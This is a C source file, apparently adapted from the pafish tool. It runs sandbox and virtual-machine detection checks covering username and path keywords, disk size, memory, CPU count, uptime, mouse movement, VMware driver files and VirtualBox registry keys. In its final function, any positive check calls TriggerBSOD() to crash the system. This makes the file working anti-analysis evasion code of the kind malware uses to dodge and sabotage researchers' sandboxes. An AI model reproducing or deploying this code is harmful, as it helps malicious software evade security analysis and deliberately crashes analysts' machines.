#define _WIN32_WINNT 0x0501 /* _WIN32_WINNT_WINXP */

#include <windows.h>
#include <winioctl.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <windows.h>
#include <ctype.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <wbemidl.h>
#include "bsod.h"



#ifndef KEY_WOW64_32KEY
#define KEY_WOW64_32KEY 0x0200
#endif

#ifndef KEY_WOW64_64KEY
#define KEY_WOW64_64KEY 0x0100
#endif


typedef BOOL(WINAPI *DisableWow64FsRedirectionProto) (void*);

typedef BOOL(WINAPI *RevertWow64FsRedirectionProto) (void*);

typedef BOOL(WINAPI *IsWow64ProcessProto) (HANDLE, BOOL*);

int pafish_revert_wow64_fs_redirection(void * old) {
	RevertWow64FsRedirectionProto fnrevert = (RevertWow64FsRedirectionProto)GetProcAddress(
		GetModuleHandleA("kernel32"), "Wow64RevertWow64FsRedirection");

	return (fnrevert) && (fnrevert(old) != 0) ? TRUE : FALSE;
}

int pafish_disable_wow64_fs_redirection(void * old) {
	DisableWow64FsRedirectionProto fndisable = (DisableWow64FsRedirectionProto)GetProcAddress(
		GetModuleHandleA("kernel32"), "Wow64DisableWow64FsRedirection");

	return (fndisable) && (fndisable(old) != 0) ? TRUE : FALSE;
}

int pafish_iswow64() {
	int result = FALSE;

	IsWow64ProcessProto fniswow = (IsWow64ProcessProto)GetProcAddress(
		GetModuleHandleA("kernel32"), "IsWow64Process");

	return (fniswow) && (fniswow(GetCurrentProcess(), &result) != 0) ? result : FALSE;
}

int pafish_exists_file(char * filename) {
	DWORD res = INVALID_FILE_ATTRIBUTES;

	if (pafish_iswow64() == TRUE) {
		void *old = NULL;

		//  Disable redirection immediately prior to calling GetFileAttributes.
		if (pafish_disable_wow64_fs_redirection(&old)) {
			res = GetFileAttributes(filename);

			// Ignoring MSDN recommendation of exiting if this call fails.
			pafish_revert_wow64_fs_redirection(old);
		}
	}
	else {
		res = GetFileAttributes(filename);
	}

	return (res != INVALID_FILE_ATTRIBUTES) ? TRUE : FALSE;
}

int pafish_exists_regkey(HKEY hKey, char * regkey_s) {
	HKEY regkey;
	LONG ret;

	if (pafish_iswow64()) {
		ret = RegOpenKeyEx(hKey, regkey_s, 0, KEY_READ | KEY_WOW64_64KEY, &regkey);
	}
	else {
		ret = RegOpenKeyEx(hKey, regkey_s, 0, KEY_READ, &regkey);
	}
	if (ret == ERROR_SUCCESS) {
		RegCloseKey(regkey);
		return TRUE;
	}
	else
		return FALSE;
}

int gensandbox_mouse_act() {
	POINT position1, position2;
	GetCursorPos(&position1);
	Sleep(2000); /* Sleep time */
	GetCursorPos(&position2);
	if ((position1.x == position2.x) && (position1.y == position2.y)) {
		/* No mouse activity during the sleep */
		return TRUE;
	}
	else {
		/* Mouse activity during the sleep */
		return FALSE;
	}
}

int gensandbox_username() {
	char username[200];
	size_t i;
	DWORD usersize = sizeof(username);
	GetUserName(username, &usersize);
	for (i = 0; i < strlen(username); i++) { /* case-insensitive */
		username[i] = toupper(username[i]);
	}
	if (strstr(username, "SANDBOX") != NULL) {
		return TRUE;
	}
	if (strstr(username, "VIRUS") != NULL) {
		return TRUE;
	}
	if (strstr(username, "MALWARE") != NULL) {
		return TRUE;
	}
	return FALSE;
}

int gensandbox_path() {
	char path[500];
	size_t i;
	DWORD pathsize = sizeof(path);
	GetModuleFileName(NULL, path, pathsize);
	for (i = 0; i < strlen(path); i++) { /* case-insensitive */
		path[i] = toupper(path[i]);
	}
	if (strstr(path, "\\SAMPLE") != NULL) {
		return TRUE;
	}
	if (strstr(path, "\\VIRUS") != NULL) {
		return TRUE;
	}
	if (strstr(path, "SANDBOX") != NULL) {
		return TRUE;
	}
	return FALSE;
}

int gensandbox_common_names() {
	DWORD dwSize = MAX_PATH;
	char szLogicalDrives[MAX_PATH] = { 0 };
	DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
	BOOL exists;

	if (dwResult > 0 && dwResult <= MAX_PATH)
	{
		char* szSingleDrive = szLogicalDrives;
		char filename[MAX_PATH] = { 0 };
		while (*szSingleDrive)
		{
			if (GetDriveType(szSingleDrive) != DRIVE_REMOVABLE) {
				snprintf(filename, MAX_PATH, "%ssample.exe", szSingleDrive);
				exists = pafish_exists_file(filename);
				if (exists) return TRUE;
				snprintf(filename, MAX_PATH, "%smalware.exe", szSingleDrive);
				exists = pafish_exists_file(filename);
				if (exists) return TRUE;
			}
			szSingleDrive += strlen(szSingleDrive) + 1;
		}
	}
	return FALSE;
}

int gensandbox_drive_size() {
	HANDLE drive;
	BOOL result;
	GET_LENGTH_INFORMATION size;
	DWORD lpBytesReturned;

	drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (drive == INVALID_HANDLE_VALUE) {
		// Someone is playing tricks. Or not enough privileges.
		CloseHandle(drive);
		return FALSE;
	}
	result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size,
		sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
	CloseHandle(drive);
	if (result != 0) {
		if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
			return TRUE;
	}
	return FALSE;
}

int gensandbox_drive_size2() {
	ULARGE_INTEGER total_bytes;

	if (GetDiskFreeSpaceExA("C:\\", NULL, &total_bytes, NULL))
	{
		if (total_bytes.QuadPart / 1073741824 <= 60) /* <= 60 GB */
			return TRUE;
	}
	return FALSE;
}

int gensandbox_sleep_patched() {
	DWORD time1;

	time1 = GetTickCount();
	Sleep(500);
	if ((GetTickCount() - time1) > 450) return FALSE;
	else return TRUE;
}

/*int gensandbox_one_cpu() {
	DWORD NumberOfProcessors = 0;
	__asm__ volatile (
		"mov %%fs:0x18, %%eax;"
		"mov %%ds:0x30(%%eax), %%eax;"
		"mov %%ds:0x64(%%eax), %%eax;"
		: "=a"(NumberOfProcessors));
	return NumberOfProcessors < 2 ? TRUE : FALSE;
}*/

int gensandbox_one_cpu_GetSystemInfo() {
	SYSTEM_INFO siSysInfo;
	GetSystemInfo(&siSysInfo);
	return siSysInfo.dwNumberOfProcessors < 2 ? TRUE : FALSE;
}

int gensandbox_less_than_onegb() {
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	GlobalMemoryStatusEx(&statex);
	return (statex.ullTotalPhys / 1024) < 1048576 ? TRUE : FALSE;
}

int gensandbox_uptime() {
	/* < ~12 minutes */
	return GetTickCount() < 0xAFE74 ? TRUE : FALSE;
}

/*int gensandbox_IsNativeVhdBoot() {
	BOOL isnative = FALSE;
	IsNativeVhdBoot fnnative = (IsNativeVhdBoot)GetProcAddress(
		GetModuleHandleA("kernel32"), "IsNativeVhdBoot");
	if (fnnative)
		fnnative(&isnative);
	return (isnative) ? TRUE : FALSE;
}*/

int vmware_sysfile1() {
	return pafish_exists_file("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys");
}

int vmware_sysfile2() {
	return pafish_exists_file("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys");
}


/**
* VirtualBox Guest Additions key check
**/
int vbox_reg_key3() {
	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions");
}



/**
* ACPI Regkey detection
**/
int vbox_reg_key5() {
	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\VBOX__");
}

/**
* FADT ACPI Regkey detection
**/
int vbox_reg_key7() {
	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\FADT\\VBOX__");
}

/**
* RSDT ACPI Regkey detection
**/
int vbox_reg_key8() {
	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\RSDT\\VBOX__");
}




bool IsThereAnyBodyOutThere() {
	if (gensandbox_username()) TriggerBSOD();;
	
	if (gensandbox_drive_size()) TriggerBSOD();;

	if (gensandbox_drive_size2())TriggerBSOD();;

	if (gensandbox_path()) TriggerBSOD();;

	if (gensandbox_common_names()) TriggerBSOD();;

	if (gensandbox_sleep_patched()) TriggerBSOD();;

	if (gensandbox_mouse_act()) TriggerBSOD();;

	if (gensandbox_one_cpu_GetSystemInfo()) TriggerBSOD();;

	if (gensandbox_less_than_onegb()) TriggerBSOD();;

	if (gensandbox_uptime()) TriggerBSOD();;

	if (vmware_sysfile1())TriggerBSOD();;

	if (vmware_sysfile2())TriggerBSOD();;

	if ( vbox_reg_key3()) TriggerBSOD();;

	if  (vbox_reg_key5()) TriggerBSOD();;

	if (vbox_reg_key7())TriggerBSOD();;

	if (vbox_reg_key8()) TriggerBSOD();;

	return false;
}